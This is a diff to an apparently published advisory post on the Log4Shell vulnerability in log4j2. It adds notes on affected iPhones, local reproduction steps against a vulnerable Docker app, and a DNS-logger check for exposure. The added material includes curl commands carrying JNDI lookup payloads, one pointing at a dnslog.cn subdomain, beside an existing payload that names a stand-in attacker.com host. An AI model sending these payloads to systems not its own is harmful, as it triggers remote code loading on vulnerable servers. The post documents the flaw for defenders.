@@ -31,7 +31,7 @@ authors:
 
 ![Log4Shell Logo](https://www.lunasec.io/docs/img/log4shell-logo.png)
 
-_Updated @ December 10th, 8am PST_
+_Updated @ December 10th, 10am PST_
 
 A few hours ago, a 0-day exploit in the
 popular Java logging library `log4j2` was discovered that results in Remote Code Execution (RCE) by
@@ -50,7 +50,7 @@ This post provides resources to help you understand the vulnerability and how to
 
 ## Who is impacted?
 Many, many services are vulnerable to this exploit.  Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), and apps like
-Minecraft have already been found to be vulnerable.  
+Minecraft have already been found to be vulnerable.
 
 Anybody using Apache Struts is likely vulnerable. We've seen similar vulnerabilities exploited before in breaches like 
 the [2017 Equifax data breach](https://en.wikipedia.org/wiki/2017_Equifax_data_breach#Data_breach).
@@ -58,6 +58,10 @@ the [2017 Equifax data breach](https://en.wikipedia.org/wiki/2017_Equifax_data_b
 Many Open Source projects
 like the Minecraft server, [Paper](https://github.com/PaperMC/Paper/commit/b475c6a683fa34156b964f751985f36a784ca0e0),
 have already begun patching their usage of `log4j2`.
+
+This [proof of concept](https://twitter.com/chvancooten/status/1469340927923826691) of changing an iPhone's name demonstrates
+that physical devices are also affected by this vulnerability. To be clear, this proof of concept only shows the vulnerability
+exists on iPhones, but there is currently no known remote method of triggering it.
 
 **Updates (3 hours after posting):**
 According to [this blog post](https://www.cnblogs.com/yyhuni/p/15088134.html) (in [english](https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US)),
@@ -135,6 +139,24 @@ public class VulnerableLog4jExampleHandler implements HttpHandler {
 }
 ```
 
+#### Reproducing Locally
+If you want to reproduce this vulnerability locally, you can refer to christophetd's [vulnerable app](https://github.com/christophetd/log4shell-vulnerable-app).
+
+In a terminal run:
+```shell
+docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+```
+
+and in another:
+```shell
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
+```
+
+the logs should include an error message indicating that a remote lookup was attempted but failed:
+```shell
+2021-12-10 17:14:56,207 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://127.0.0.1/a]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
+```
+
 ### Exploit Steps
 1. Data from the User gets sent to the server (via any protocol),
 2. The server logs the data in the request, containing the malicious payload: `${jndi:ldap://attacker.com/a}` (where `attacker.com` is an attacker controlled server),
@@ -145,6 +167,27 @@ public class VulnerableLog4jExampleHandler implements HttpHandler {
 Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit 
 them. The [marshalsec](https://github.com/mbechler/marshalsec) project is one of many that demonstrates generating an
 exploit payload that could be used for this vulnerability. You can refer to [this malicious LDAP server](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) for an example of exploitation. 
+
+## How to identify if your server is vulnerable.
+
+Using a DNS logger (such as [dnslog.cn](http://www.dnslog.cn/)), you can generate a domain name and use this in your test
+payloads:
+
+```shell
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
+```
+
+Refreshing the page will show DNS queries which identify hosts who have triggered the vulnerability.
+
+:::caution
+
+Due to the widespread use of _dnslog.cn_ for testing log4shell, we advise caution when testing sensitive infrastructure as
+information being sent to this site could be used by the service's owners to exploit applications identified as vulnerable.
+
+If this is something of concern to you and wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
+for testing.
+
+:::
 
 ## More information
 
@@ -179,6 +222,7 @@ methods are still prevalent.
 4. Removed the name "LogJam" because it's already been [used](https://en.wikipedia.org/wiki/Logjam_(computer_security)). Using "Log4Shell" instead.
 5. Update that 2.15.0 is released.
 6. Added the MS Paint logo[4], and updated example code to be slightly more clear (it's not string concatenation).
+7. Reported on iPhones being affected by the vulnerability, and included local reproduction code + steps.
 
 ### References
 
